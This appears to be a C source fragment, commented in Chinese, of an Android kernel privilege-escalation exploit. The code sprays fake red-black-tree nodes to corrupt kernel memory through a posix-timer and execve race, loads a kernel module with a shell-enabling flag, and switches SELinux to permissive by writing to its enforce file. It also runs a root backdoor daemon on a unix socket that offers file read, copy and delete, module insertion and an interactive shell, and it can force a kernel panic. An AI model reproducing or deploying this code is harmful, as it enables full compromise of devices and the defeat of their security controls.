    if (g_fcfork) {
        /* fork 逃逸：子进程继承 uid0 + init 域（fork 不做域转换，无 entrypoint 校验），
         * 立刻在进程内执行 payload；父进程 pid 已清零，绝不能 exit（do_exit(pid=0) 会 panic）。 */
        signal(SIGPIPE, SIG_IGN);
        pid_t c = fork();
        if (c == 0) {
            /* 子进程：立刻开始 klogctl 轮询抓 G-OK/G-BAD（kmsg 环仅约 8s）。 */
            fc_fork_escape();
            _exit(0);
        }
        dprintf(1, "[FF] fork逃逸 child=%d parent=%d（父进程继续 init_module）\n", (int)c, (int)getpid());
        prctl(PR_SET_NAME, "FC_PARENT", 0, 0, 0);
        /* 父进程不再 pause：继续往下走 init_module / 取证，末尾统一 pause 保命 */
    }
    if (g_fcdiag) {
        fc_ladder();
        for (;;) pause();
    }
    if (g_nomod) rc = 0;   /* SHELLX: 不加载模块，换域成功即视为 rc=0 直接 exec */
    if (g_nomod) {
        probe_selfreport("P1");
        tm_log("KK P1 done\n");
        if (g_daemon && g_daemon[0]) {
            /* DAEMONX:<name>：probe 以 uid0+域常驻，监听抽象 unix socket @<name>。
             * 命令由本进程内建实现（不 fork、不 exec sh），避免 init 域无 shell_exec 权限。 */
            int ds;
            struct sockaddr_un sa;
            char cb[256];
            memset(&sa, 0, sizeof sa);
            sa.sun_family = AF_UNIX;
            sa.sun_path[0] = '\0';
            snprintf(sa.sun_path + 1, sizeof sa.sun_path - 1, "%s", g_daemon);
            ds = socket(AF_UNIX, SOCK_STREAM, 0);
            tm_log("KK sock=%d errno=%d\n", ds, errno);
            if (ds < 0 || bind(ds, (struct sockaddr *)&sa,
                               (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + strlen(g_daemon))) < 0 ||
                listen(ds, 8) < 0) {
                tm_log("KK bind/listen FAIL errno=%d\n", errno);
                dprintf(1, "[S] daemon bind @%s failed errno=%d(%s) uid=%d\n",
                        g_daemon, errno, strerror(errno), (int)getuid());
                fflush(stdout);
                probe_selfreport("P2");
                for (;;) pause();
            }
            tm_log("KK ready @%s uid=%d\n", g_daemon, (int)getuid());
            dprintf(1, "[S] daemon @%s ready uid=%d euid=%d\n", g_daemon, (int)getuid(), (int)geteuid());
            fflush(stdout);
            for (;;) {
                int cc = accept(ds, NULL, NULL);
                char ln[1024];
                int n = 0, cf, cn;
                if (cc < 0) {
                    if (errno == EINTR) continue;
                    break;
                }
                while (n < (int)sizeof ln - 1 && read(cc, &ln[n], 1) == 1 && ln[n] != '\n') n++;
                ln[n] = 0;
                while (n > 0 && (ln[n - 1] == '\r' || ln[n - 1] == ' ')) ln[--n] = 0;
                if (n == 0) {
                    close(cc);
                    continue;
                }
                tm_log("KK cmd=%s\n", ln);
                if (!strcmp(ln, "id") || !strcmp(ln, "ctx")) {
                    cb[0] = 0;
                    cf = open("/proc/self/attr/current", O_RDONLY);
                    cn = cf >= 0 ? (int)read(cf, cb, sizeof cb - 1) : -1;
                    if (cf >= 0) close(cf);
                    if (cn > 0) cb[cn] = 0;
                    dprintf(cc, "uid=%d euid=%d gid=%d\nctx=%s", (int)getuid(), (int)geteuid(), (int)getgid(),
                            cn > 0 ? cb : "?\n");
                } else if (!strncmp(ln, "cat ", 4)) {
                    cf = open(ln + 4, O_RDONLY);
                    if (cf < 0) {
                        dprintf(cc, "open %s: %s\n", ln + 4, strerror(errno));
                    } else {
                        char b[8192];
                        ssize_t r;
                        while ((r = read(cf, b, sizeof b)) > 0) {
                            if (write(cc, b, (size_t)r) != r) break;
                        }
                        close(cf);
                        dprintf(cc, "\n");
                    }
                } else if (!strncmp(ln, "ls ", 3)) {
                    DIR *dp = opendir(ln + 3);
                    if (!dp) {
                        dprintf(cc, "opendir %s: %s\n", ln + 3, strerror(errno));
                    } else {
                        struct dirent *de;
                        while ((de = readdir(dp)) != NULL) dprintf(cc, "%s\n", de->d_name);
                        closedir(dp);
                    }
                } else if (!strncmp(ln, "cp ", 3)) {
                    char *sp = ln + 3;
                    char *tb = strchr(sp, ' ');
                    if (!tb) {
                        dprintf(cc, "usage: cp SRC DST\n");
                    } else {
                        int a, b2;
                        *tb = 0;
                        a = open(sp, O_RDONLY);
                        b2 = a < 0 ? -1 : open(tb + 1, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                        if (a < 0 || b2 < 0) {
                            dprintf(cc, "cp: %s\n", strerror(errno));
                        } else {
                            char x[8192];
                            ssize_t r;
                            long tot = 0;
                            while ((r = read(a, x, sizeof x)) > 0) {
                                if (write(b2, x, (size_t)r) != r) break;
                                tot += (long)r;
                            }
                            dprintf(cc, "cp ok %ld bytes\n", tot);
                        }
                        if (a >= 0) close(a);
                        if (b2 >= 0) close(b2);
                    }
                } else if (!strncmp(ln, "rm ", 3)) {
                    dprintf(cc, "rm %s: %s\n", ln + 3, unlink(ln + 3) == 0 ? "ok" : strerror(errno));
                } else if (!strncmp(ln, "mkdir ", 6)) {
                    dprintf(cc, "mkdir %s: %s\n", ln + 6, mkdir(ln + 6, 0755) == 0 ? "ok" : strerror(errno));
                } else if (!strncmp(ln, "chmod ", 6)) {
                    char *mp = ln + 6;
                    char *pb = strchr(mp, ' ');
                    if (!pb) {
                        dprintf(cc, "usage: chmod MODE PATH\n");
                    } else {
                        *pb = 0;
                        dprintf(cc, "chmod %s: %s\n", pb + 1,
                                chmod(pb + 1, (mode_t)strtoul(mp, NULL, 8)) == 0 ? "ok" : strerror(errno));
                    }
                } else if (!strncmp(ln, "insmod ", 7)) {
                    cf = open(ln + 7, O_RDONLY);
                    if (cf < 0) {
                        dprintf(cc, "insmod open: %s\n", strerror(errno));
                    } else {
                        struct stat st;
                        long ir = -1;
                        if (fstat(cf, &st) == 0) ir = syscall(__NR_finit_module, cf, "", 0);
                        dprintf(cc, "insmod rc=%ld errno=%d(%s)\n", ir, errno, strerror(errno));
                    }
                    if (cf >= 0) close(cf);
                } else if (!strcmp(ln, "sh")) {
                    /* 交互 shell：permissive 后 init→shell_exec 的 execve 放行。
                     * execve 会替换本进程，守护随之消失（目的就是拿到 shell）。
                     * 失败则返回错误，守护继续存活。 */
                    dup2(cc, 0);
                    dup2(cc, 1);
                    dup2(cc, 2);
                    {
                        char *av[] = { "/system/bin/sh", "-i", NULL };
                        execv("/system/bin/sh", av);
                    }
                    dprintf(cc, "exec sh: %s\n", strerror(errno));
                } else {
                    dprintf(cc, "unsupported: %s\n", ln);
                }
                close(cc);
            }
            probe_selfreport("P2");
            for (;;) pause();
        }
        if (g_shellcmd && !strncmp(g_shellcmd, "PWRITE:", 7)) {
            /* PWRITE:<path>:<text>：probe 自身直接写文件（不 fork、不 exec、不起 sh） */
            const char *p = g_shellcmd + 7;
            const char *c = strchr(p, ':');
            char wp[256];
            int wl = c ? (int)(c - p) : 0;
            int wf = -1;
            if (wl > 0 && wl < (int)sizeof wp) {
                memcpy(wp, p, (size_t)wl);
                wp[wl] = 0;
                wf = open(wp, O_WRONLY | O_CREAT | O_APPEND, 0666);
                if (wf >= 0) {
                    const char *txt = c + 1;
                    ssize_t ww = write(wf, txt, strlen(txt));
                    dprintf(1, "[S] nomod PWRITE %s rc=%ld uid=%d errno=%d\n",
                            wp, (long)ww, (int)getuid(), errno);
                    close(wf);
                } else {
                    dprintf(1, "[S] nomod PWRITE open %s failed errno=%d\n", wp, errno);
                }
            } else {
                dprintf(1, "[S] nomod PWRITE 参数非法\n");
            }
            fflush(stdout);
            probe_selfreport("P2");
            for (;;) pause();
        }
        dprintf(1, "[S] nomod direct execve [%s] uid=%d euid=%d\n",
                g_shellcmd ? g_shellcmd : "?", (int)getuid(), (int)geteuid());
        fflush(stdout);
        if (g_shellcmd) execl(g_shellcmd, g_shellcmd, (char *)NULL);   /* 直接 execve，不经 sh -c */
        probe_selfreport("P2");
        dprintf(1, "[S] nomod execve failed errno=%d(%s)\n", errno, strerror(errno));
        fflush(stdout);
        for (;;) pause();
    }
    if (g_fcimp) {
        /* 唤醒即刻加载模块：不做任何预热，压缩到被杀前的窗口内 */
        prctl(PR_SET_NAME, "W0_CALL", 0, 0, 0);
        dprintf(1, "[F] 唤醒即调 init_module len=%d\n", g_modlen);
        fflush(stdout);
        errno = 0;
        rc = syscall(SYS_init_module, g_modbuf, (unsigned long)g_modlen, "allow_shell=1");
        e = errno;
        snprintf(nm, sizeof nm, "W1_R%lx", (unsigned long)(rc == 0 ? 0 : (long)e));
        prctl(PR_SET_NAME, nm, 0, 0, 0);
        dprintf(1, "[F] init_module rc=%ld errno=%d(%s)\n", rc, e, strerror(e));
        /* 结果同时写 /dev/kmsg：panic 后仍可由 pstore/init 读回，避免又丢一次证据 */
        int kf = open("/dev/kmsg", O_WRONLY | O_NONBLOCK);
        if (kf >= 0) {
            char kb[128];
            int kn = snprintf(kb, sizeof kb, "[KKP] init_module rc=%ld errno=%d\n", rc, e);
            if (kn > 0) { if (write(kf, kb, (size_t)kn) < 0) {} }
            close(kf);
        }
        /* comm 里把 rc 留下来（不覆盖成 W2_PAUSE），父进程/主机隔多久都能读到 */
        snprintf(nm, sizeof nm, "W2_r%ld_e%d", rc, e);
        prctl(PR_SET_NAME, nm, 0, 0, 0);
        /* 取证：rc 只是数字，内核拒绝原文在 kmsg 里（Unknown symbol / vermagic / CRC）。
         * 全部经 fd1（父进程 sel-pipe）回传，主机侧实时落盘。 */
        dprintf(1, "[K] rc=%ld errno=%d(%s)，开始取证\n", rc, e, strerror(e));
        kmsg_dump_tail(1, 8192);
        module_state_probe(1);
        dprintf(1, "[K] 取证结束，驻留\n");
        /* FCIMPX: 模块已把 misc_list 修回真实链，这里直接 exec 常驻命令通道 */
        if (g_act && rc == 0) {
            if (g_shellcmd) {
                dprintf(1, "[S] module ok, uid=%d euid=%d, exec sh -c [%s]\n",
                        (int)getuid(), (int)geteuid(), g_shellcmd);
                fflush(stdout);
                execl("/system/bin/sh", "sh", "-c", g_shellcmd, (char *)NULL);
                dprintf(1, "[S] exec sh failed errno=%d(%s)\n", errno, strerror(errno));
                fflush(stdout);
            }
            dprintf(1, "[A] module ok, exec %s\n", g_actcmd);
            fflush(stdout);
            execl(g_actcmd, g_actcmd, (char *)NULL);
            dprintf(1, "[A] exec %s failed errno=%d(%s)\n", g_actcmd, errno, strerror(errno));
            fflush(stdout);
        }
        for (;;) pause();
    }
    if (g_fcput) {
        /* 唤醒即刻把模块落到 /data/misc（init 域可读），随后由合法 init relay insmod */
        long off = 0;
        int pf;
        prctl(PR_SET_NAME, "P0_OPEN", 0, 0, 0);
        dprintf(1, "[F] 唤醒即写模块到 /data/misc/kk.ko len=%d\n", g_modlen);
        fflush(stdout);
        pf = open("/data/misc/kk.ko", O_WRONLY | O_CREAT | O_TRUNC, 0644);
        snprintf(nm, sizeof nm, "P1_F%d", pf);
        prctl(PR_SET_NAME, nm, 0, 0, 0);
        if (pf >= 0 && g_modbuf && g_modlen > 0) {
            while (off < (long)g_modlen) {
                ssize_t w = write(pf, g_modbuf + off, (size_t)(g_modlen - off));
                if (w <= 0) break;
                off += w;
                snprintf(nm, sizeof nm, "P2_W%ld", off / 1024);
                prctl(PR_SET_NAME, nm, 0, 0, 0);
            }
            close(pf);
            snprintf(nm, sizeof nm, "P3_OK%ld", off / 1024);
        } else {
            snprintf(nm, sizeof nm, "P3_E%d", pf < 0 ? errno : -1);
        }
        prctl(PR_SET_NAME, nm, 0, 0, 0);
        dprintf(1, "[F] 写模块结束 off=%ld\n", off);
        prctl(PR_SET_NAME, "P4_PAUSE", 0, 0, 0);
        for (;;) pause();
    }
    if (!g_modbuf || g_modlen <= 0) {
        prctl(PR_SET_NAME, "FC_NOMOD", 0, 0, 0);
        dprintf(1, "[F] 没有模块内存，跳过 init_module\n");
    } else {
        prctl(PR_SET_NAME, "FC_CALL", 0, 0, 0);
        errno = 0;
        rc = syscall(SYS_init_module, g_modbuf, (unsigned long)g_modlen, "allow_shell=1");
        e = errno;
        snprintf(nm, sizeof nm, rc == 0 ? "FC_OK%x" : "FC_E%x", rc == 0 ? 0 : e);
        prctl(PR_SET_NAME, nm, 0, 0, 0);
        /* 把 FC_OK/FC_E<errno> 在 comm 里停住 2s，父进程 2ms 采样一定能抓到 */
        sleep(2);
        dprintf(1, "[F] init_module(len=%d) rc=%ld errno=%d(%s)\n",
                g_modlen, rc, e, strerror(e));
        /* init 域对 shell_data_file 无写权限，stdout 会被静默吞掉；
         * /data/misc/perfetto-traces 是 init 域可写的落点，结果写这里。 */
        {
            const char *paths[3] = {"/data/misc/kk_res.txt",
                                    "/data/misc/perfetto-traces/fc_res.txt",
                                    "/data/local/tmp/fc_res.txt"};
            char rb[192];
            int rn = snprintf(rb, sizeof rb,
                              "init_module rc=%ld errno=%d(%s) comm=%s\n",
                              rc, e, strerror(e), nm);
            for (int pi = 0; pi < 3; pi++) {
                int rf = open(paths[pi], O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (rf >= 0) {
                    if (write(rf, rb, (size_t)rn) < 0) {}
                    close(rf);
                    break;
                }
            }
        }
    }
    if (rc == 0 && g_act) {
        probe_dump_brief();
        dprintf(1, "[A] module ok, probe dumped\n");
        fflush(stdout);
    }
    if (rc == 0 && g_panic) {
        /* 主动 panic：完整 printk 环保留到 /sys/fs/pstore/dmesg-ramoops-0，
         * 重启后 shell 可直接 cat（该文件可读，只是不能 ls 目录）。 */
        int sf;
        dprintf(1, "[P] panic now\n");
        fflush(stdout);
        usleep(300000);
        sf = open("/proc/sysrq-trigger", O_WRONLY);
        if (sf >= 0) {
            if (write(sf, "c", 1) < 0) {}
            close(sf);
            usleep(300000);
        }
        syscall(SYS_reboot, 0xfee1dead, 672274793, 0xcdef0123, (void *)0);
        syscall(SYS_reboot, 0xfee1dead, 672274793, 0x01234567, (void *)0);
        dprintf(1, "[P] panic trigger failed errno=%d(%s)\n", errno, strerror(errno));
        fflush(stdout);
    }
    prctl(PR_SET_NAME, "FC_DONE", 0, 0, 0);
    dprintf(1, "[F] probe 驻留 pid=%d（绝不 exit/fork/exec）\n", (int)getpid());
    for (;;) pause();
}

/* exec 自检：fork 一个子进程去 exec，父用 waitpid 回收并打印状态。
 * 直接 execl 成功时进程被替换、永不返回，只能看到僵尸，无法区分失败 errno。 */
static void kdom_exec_probe(const char *path, const char *a1, const char *a2)
{
    int st = 0;
    pid_t p;
    errno = 0;
    p = fork();
    if (p < 0) { dprintf(1, "[V] fork(%s) failed errno=%d\n", path, errno); return; }
    if (p == 0) {
        errno = 0;
        execl(path, path, a1, a2, (char *)NULL);
        int e = errno;
        dprintf(1, "[V] child execl(%s) FAILED errno=%d (%s)\n", path, e, strerror(e));
        _exit(e ? e : 1);
    }
    waitpid(p, &st, 0);
    if (WIFEXITED(st)) {
        int c = WEXITSTATUS(st);
        dprintf(1, "[V] child(%s) exit=%d %s\n", path, c,
                c ? "=> exec 被拒(见上行 child errno)" : "=> exec 成功且程序正常退出");
    } else if (WIFSIGNALED(st)) {
        dprintf(1, "[V] child(%s) killed by signal=%d\n", path, WTERMSIG(st));
    }
}

/* ==== kernel 域自检: 每一步放独立孙子进程, 被杀不影响 probe 本体 ==== */
static int kd_s_open_enforce(void)
{
    int fd = open("/sys/fs/selinux/enforce", O_RDWR);
    return fd >= 0 ? 0 : 1;
}
static int kd_s_write_enforce(void)
{
    int fd = open("/sys/fs/selinux/enforce", O_RDWR);
    if (fd < 0) return 1;
    if (write(fd, "0", 1) != 1) return 2;
    lseek(fd, 0, SEEK_SET);
    char b[8]; memset(b, 0, sizeof b);
    if (read(fd, b, 7) < 1) return 3;
    close(fd);
    return b[0] == '0' ? 0 : 4;
}
static int kd_s_kallsyms(void)
{
    int fd = open("/proc/kallsyms", O_RDONLY);
    if (fd < 0) return 1;
    close(fd);
    return 0;
}
static int kd_s_readbootid(void)
{
    int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
    if (fd < 0) return 1;
    close(fd);
    return 0;
}
/* 返回: >=0 = 孙子退出码(0 成功); <0 = 被信号 -N 杀掉 */
static int kd_try(int (*fn)(void))
{
    int st = 0;
    pid_t p = fork();
    if (p < 0) return -1000;
    if (p == 0) _exit(fn());
    waitpid(p, &st, 0);
    if (WIFEXITED(st)) return WEXITSTATUS(st);
    if (WIFSIGNALED(st)) return -WTERMSIG(st);
    return -999;
}

#define KD_F_OPEN_ENFORCE 0x01
#define KD_F_WRITE_PERM   0x02
#define KD_F_KILLED       0x04
#define KD_F_KALLSYMS     0x08
#define KD_F_BOOTID       0x10
#define KD_F_EXEC         0x20
static int kdom_selftest(void)
{
    int ok_open, ok_write, ok_sym, ok_bid;
    ok_open  = kd_try(kd_s_open_enforce);
    if (ok_open < 0) return KD_F_KILLED | 0x40;      /* open 阶段就被杀 */
    ok_write = kd_try(kd_s_write_enforce);
    if (ok_write < 0) return KD_F_KILLED | 0x80;     /* write 阶段被杀 */
    ok_sym = kd_try(kd_s_kallsyms);
    ok_bid = kd_try(kd_s_readbootid);
    int mask = 0;
    if (ok_open == 0)  mask |= KD_F_OPEN_ENFORCE;
    if (ok_write == 0) mask |= KD_F_WRITE_PERM;
    if (ok_sym == 0)   mask |= KD_F_KALLSYMS;
    if (ok_bid == 0)   mask |= KD_F_BOOTID;
    /* permissive 若已打开, 直接从 probe 本体 exec sh, 输出可落日志 */
    if (mask & KD_F_WRITE_PERM) {
        errno = 0;
        execl("/system/bin/sh", "sh", "-c", "id; echo EXEC_SH_OK; exit 99", (char *)NULL);
        mask |= KD_F_EXEC;
    }
    return mask;
}

static void root_worker_forever(void)
{
    char cbuf[160];
    printf("[U] --- 放行 probe 执行: %s ---\n", g_ucmd ? g_ucmd : "id");
    fflush(stdout);
    if (g_wake_fd[1] >= 0) {
        ssize_t wrg = write(g_wake_fd[1], "G", 1);
        printf("[U] wake2 fd=%d rc=%ld errno=%d\n", g_wake_fd[1], (long)wrg, errno);
        fflush(stdout);
    }
    /* kernel 域写不了文件也写不了 pipe, 自检结果通过子进程退出码带回:
     * bit0 open(enforce)  bit1 write(0)  bit2 回读为 0  bit3 exec sh 成功(被替换不会返回)
     * bit4 kallsyms 可读 */
    if (!strcmp(g_ucmd ? g_ucmd : "", "SELFTEST")) {
        int st = 0;
        waitpid(g_probe_pid, &st, 0);
        if (WIFEXITED(st))
            printf("[V] selftest exit=%d mask=0x%02x [open_enforce=%d write_perm=%d kallsyms=%d bootid=%d "
                   "killed_at_open=%d killed_at_write=%d exec=%d]\n",
                   WEXITSTATUS(st), WEXITSTATUS(st),
                   !!(WEXITSTATUS(st) & 0x01), !!(WEXITSTATUS(st) & 0x02),
                   !!(WEXITSTATUS(st) & 0x08), !!(WEXITSTATUS(st) & 0x10),
                   !!(WEXITSTATUS(st) & 0x40), !!(WEXITSTATUS(st) & 0x80),
                   !!(WEXITSTATUS(st) & 0x20));
        else if (WIFSIGNALED(st))
            printf("[V] selftest killed by signal=%d\n", WTERMSIG(st));
        fflush(stdout);
    }
    if (g_sel_fd[0] >= 0) {
        char sb[512]; ssize_t sr;
        while ((sr = read(g_sel_fd[0], sb, sizeof sb)) > 0) {
            if (write(1, sb, (size_t)sr) < 0) {}
        }
        close(g_sel_fd[0]);
        g_sel_fd[0] = -1;
        fflush(stdout);
    }
    snprintf(cbuf, sizeof cbuf, "[U] probe pid=%d 领命；父进程驻留保住桥 (勿 kill)\n", (int)g_probe_pid);
    fputs(cbuf, stdout);
    fflush(stdout);
    for (;;) sleep(3600);
}

/* 构造假 rb_node 模板(连续喷涂与单发喷涂共用) */
static void build_tmpl(unsigned char *tmpl)
{
    memset(tmpl, 0, 4096);
    int off = (int)(g_node_va & 0xfff);
    g_off = off;
    if (off + 0x18 > 4096) printf("[!] node 跨页 off=%#x\n", off);
    if (g_insert) { build_ins_tmpl(tmpl, off); return; }
    /* -D 自证先把目标改成"本页内的 MARK", 再统一铺模板, 保证所有假节点的
     * rb_left 都指向同一个 MARK(否则命中别的对象时会写到真实 cred/comm 上)。 */
    if (g_dverify) {
        /* MARK 必须在本页、且不与任何假节点 [off+k*0x110, +0x18) 重叠。
         * 每个对象内 [node+0x18, node+0x110) 是安全空档 → 取 off+0x30。 */
        int voff = off + 0x30;
        if (voff + 0x10 > 4096) voff = off + 0x20;
        if (voff + 0x10 > 4096) voff = (off + 0x800) & 0xfff;
        uint64_t mark = 0x4d41524b4d41524bULL;      /* "MARKMARK" */
        *(uint64_t *)(tmpl + voff) = mark;
        *(uint64_t *)(tmpl + voff + 8) = mark;
        g_target = (g_node_va & ~0xfffULL) | (uint64_t)voff;
        g_dvoff = voff;
        printf("[B12D] 自证模式: 目标=本页 +%#x (MARK 处), 期望内核把该 8B 写成 0\n", voff);
    }
    /* -P 任意值写改用文档里的 Case1 布局:
     *   __rb_parent_color = (VICTIM-8)|1, rb_right = PAYLOAD, rb_left = 0
     * 效果只有两笔: *(VICTIM) = PAYLOAD; *(PAYLOAD) = (VICTIM-8)|1。
     * parent = VICTIM-8 是表项内部已知地址, 不会像旧 Case2 那样把 parent 甩到
     * value&~3 的 .data 上、让树根悬空, 清理时 rb_first 就一路走到嫁接节点崩掉。
     * 默认(g_nop=0)仍是清零语义: pc=0 → Case2, parent=NULL → root 更新为 target。 */
    int isp = (g_nop && !g_dverify);
    uint64_t pcv = isp ? ((g_target - 8) | 1ULL) : 0;
    uint64_t rv  = isp ? (g_ops_scr[g_wround] ? self_scratch(off) : g_ops_v[g_wround]) : 0;
    uint64_t lv  = isp ? 0 : g_target;
    if (isp)
        printf("[B12p] Case1 模板: VICTIM=%#llx PAYLOAD=%#llx pc=%#llx"
               " (副作用 *(PAYLOAD)=pc; PAYLOAD+0x10 必须为 0)\n",
               (unsigned long long)g_target, (unsigned long long)rv,
               (unsigned long long)pcv);
    *(uint64_t *)(tmpl + off) = pcv;                /* __rb_parent_color */
    *(uint64_t *)(tmpl + off + 8) = rv;             /* rb_right: Case1 的 child 必须非空 */
    *(uint64_t *)(tmpl + off + 0x10) = lv;          /* rb_left = 0 → Case1 */
    /* 全页冗余: 同一 slab 里 30 个对象的 node 位置 = off + k*0x110。
     * 2026-10-29 的 panic(release_task+0x2a4) 证明"树里最左节点不一定是 arm_i
     * 点名的那一个": 若它落在同一页的另一个对象上, 未铺模板的位置是 0 → rb_erase
     * 会把 pc=0 当成父指针, 走到野地址。把所有对齐位置都铺成同一个假节点后,
     * 只要最左节点在本页, 走到哪个对象都是安全的。 */
    for (int k = -16; k <= 16; k++) {
        int p2 = off + k * 0x110;
        if (p2 < 0 || p2 + 0x18 > 4096) continue;
        if (p2 == off) continue;                   /* 主节点已写好(含 -D 的 left) */
        if (g_dverify && p2 <= g_dvoff + 0x10 && p2 + 0x18 >= g_dvoff) continue;
        *(uint64_t *)(tmpl + p2) = pcv;
        *(uint64_t *)(tmpl + p2 + 8) = rv;
        *(uint64_t *)(tmpl + p2 + 0x10) = lv;
    }
    printf("[B12] 模板 off=%#x  pc=%#llx right=%#llx left=%#llx (head@+0x20 保持 0, "
           "避免 del 时 deref 假 head)\n",
           off, (unsigned long long)pcv, (unsigned long long)rv,
           (unsigned long long)lv);
}

/* ftrace: 本内核没有 CONFIG_DYNAMIC_FTRACE(无 available_filter_functions/set_ftrace_filter),
 * 但有 function tracer + set_ftrace_pid, 于是按 pid 精确限定, 只抓 victim 的退出路径。 */
static void ftrace_arm(int pid)
{
    relay_q("echo 8192 > %s/buffer_size_kb", TRACE_DIR);
    relay_q("echo 0 > %s/tracing_on", TRACE_DIR);
    relay_q("echo nop > %s/current_tracer", TRACE_DIR);
    relay_q("echo > %s/trace", TRACE_DIR);
    relay_q("echo %d > %s/set_ftrace_pid", pid, TRACE_DIR);
    relay_q("echo function > %s/current_tracer", TRACE_DIR);
    relay_q("echo 1 > %s/tracing_on", TRACE_DIR);
    printf("[F0] ftrace armed: function tracer, set_ftrace_pid=%d, buffer=8MB\n", pid);
}

static void ftrace_off(void)
{
    relay_q("echo 0 > %s/tracing_on", TRACE_DIR);
    printf("[F1] ftrace stopped (trace 保留, 从主机 dump)\n");
}

static int xwrite(int fd, const void *b, int n)
{
    const char *p = b;
    int off = 0;
    while (off < n) { ssize_t r = write(fd, p + off, n - off); if (r <= 0) return -1; off += (int)r; }
    return 0;
}
static int xread(int fd, void *b, int n)
{
    char *p = b;
    int off = 0;
    while (off < n) { ssize_t r = read(fd, p + off, n - off); if (r <= 0) return -1; off += (int)r; }
    return 0;
}

struct robust_list_head { void *list; long futex_offset; void *list_op_pending; };
static int g_robust = 504, g_robust_it;
static int g_usetaskid = 0;      /* 0 = CLOCK_PROCESS_CPUTIME_ID */

static void robust_setup(void)
{
    if (g_robust <= 0) return;
    size_t n = (size_t)g_robust;
    if (n > 8192) n = 8192;
    size_t span = n * 8;
    char *mem = mmap(NULL, 4096 + 2 * span, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) return;
    for (size_t i = 0; i < 4096 + 2 * span; i += 4096) mem[i] = 0;
    struct robust_list_head *head = (struct robust_list_head *)mem;
    unsigned char *entb = (unsigned char *)mem + 4096;
    unsigned char *wrdb = entb + span;
    for (size_t i = 0; i < n; i++) {
        void **e = (void **)(entb + i * 8);
        unsigned int *w = (unsigned int *)(wrdb + i * 8);
        *e = (i + 1 < n) ? (void *)(entb + (i + 1) * 8) : (void *)&head->list;
        *w = (unsigned int)SH->tgid;
    }
    head->list = (void *)entb;
    head->futex_offset = (long)span;
    head->list_op_pending = NULL;
    g_robust_it = (int)syscall(SYS_set_robust_list, head, sizeof(struct robust_list_head));
}

/* T: 建 timer -> 等 proceed 删 119 -> 等 go 执行 execve */
static void *exec_thread(void *arg)
{
    (void)arg;
    static timer_t tv[4096];
    int n = g_ntimer + (g_autoholes ? g_holes : 0);
    if (n > 4096) n = 4096;
    if (n < g_ntimer) n = g_ntimer;

    prctl(PR_SET_NAME, "timer-exec", 0, 0, 0);
    pin_cpu(g_vcpu);
    __sync_fetch_and_add(&SH->readers, 0);

    int tid = (int)syscall(SYS_gettid);
    xwrite(g_wfd, &tid, 4);

    if (g_puresh) {
        /* 纯 shell: 等父进程在 fork 之后把 8KB 空洞建好再分配 timer。
         * 这样空洞不会被 fork/pthread_create 期间的 order-1 分配提前吃掉。 */
        char hb = 0;
        if (xread(g_rfd, &hb, 1) || hb != 1) _exit(124);
    }

    int ok = 0;
    struct sigevent ev;
    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_NONE;
    /* 进程级 (pid==0) → 节点落在 signal->posix_cputimers, 解析目标是 group leader
     * 线程级           → 节点落在 tsk->posix_cputimers (task+0x9f0), 解析目标是本线程 */
    clockid_t clk = g_thread_clock ? CLOCK_THREAD_CPUTIME_ID : CLOCK_PROCESS_CPUTIME_ID;
    for (int i = 0; i < n; i++)
        if (timer_create(clk, &ev, &tv[i]) == 0) ok++;
    xwrite(g_wfd, &ok, 4);
    SH->armed = 1;
    SH->exec_tid = tid;

    /* 等父进程依据泄漏数据选定要武装的那个 (它的 slab 必须全是我们且不是 active) */
    int ai = -1;
    if (xread(g_rfd, &ai, 4)) _exit(125);
    if (ai < 0 || ai >= ok) _exit(127);
    /* 方案2 几何(修正版): 只删除 **ai 之后创建** 的 timer。
     * 依据: exit_itimers 走 hlist_add_head, 被 __lock_task_sighand(p)==NULL 跳过摘链、
     * 留在树上的只有 hlist 头部(=最后创建)那条; 要让树里那条就是我们喷涂页上的 node,
     * ai 必须是头部 ⇒ 把 ai 之后创建的 timer 全删掉。ai 之前的保留, 让包含 ai 的
     * 那个 30/30 slab 在 exit 时整体变空 → 才能走 discard_slab 回 buddy 被喷涂拿回。
     * (上一版"删掉除 ai 外全部 630 个"实测 GATE=FAIL、free(n=0): 目标 slab 只剩 1 个
     *  对象, 提前 delete 的 29 个把 slab 打成 partial, 最后 1 个释放时被 SLUB 当
     *  partial/cpu_partial 留下, 根本不回 buddy。)
     * 树里仍然只有 ai 一个节点(其余从未 settime)。 */
    {
        int del = 0;
        if (g_geomdel) {
            for (int i = ai + 1; i < ok; i++) { timer_delete(tv[i]); del++; }
            printf("[B2e] 几何改造(-H): 删除 ai 之后创建的 %d 个 timer, 让 tv[%d] 成为 hlist 头部; "
                   "ai 及其之前的 %d 个全部保留 → 目标 slab 仍 30/30 满\n", del, ai, ai + 1);
            fflush(stdout);
        } else {
            printf("[B2e] 原始几何(未删 timer): 全部 %d 个 timer 保留, tv[%d] 为全局最后创建\n",
                   ok, ai);
            fflush(stdout);
        }
    }
    {
        struct itimerspec its;
        memset(&its, 0, sizeof its);
        its.it_value.tv_sec = 3600;
        if (timer_settime(tv[ai], 0, &its, NULL)) _exit(123);
    }
    xwrite(g_wfd, &ai, 4);                        /* armed: 树里只有 1 个节点 */

    int go = 0;
    if (xread(g_rfd, &go, 1)) _exit(126);        /* 2 = go */
    robust_setup();
    {
        long long t0 = now_us();
        while (!SH->killer_ready && now_us() - t0 < 3000000LL) sched_yield();
    }
    {
        char *const argv[] = { (char *)"", NULL };
        char *envp2[128];
        int ne = 0;
        char *blk = NULL;
        /* -E: 构造大 env, 让 execve 内部的复制/审计阶段耗时到毫秒级,
         * 这样 SIGKILL 必定落在 execve 内部 (comm 仍是 timer-exec),
         * 而不是像干净系统那样 200us 内就完成 exec、刀落在窗口外。 */
        if (g_envkb > 0) {
            int total = g_envkb * 1024;
            int nv = 64;
            int per = total / nv;
            if (per < 32) { nv = 1; per = total; }
            blk = malloc((size_t)nv * (size_t)per);
            if (blk) {
                for (int k = 0; k < nv; k++) {
                    char *s = blk + (size_t)k * (size_t)per;
                    s[0] = 'E'; s[1] = (char)('0' + (k / 10) % 10); s[2] = (char)('0' + k % 10); s[3] = '=';
                    memset(s + 4, 'A' + (k % 26), (size_t)per - 5);
                    s[per - 1] = 0;
                    envp2[ne++] = s;
                }
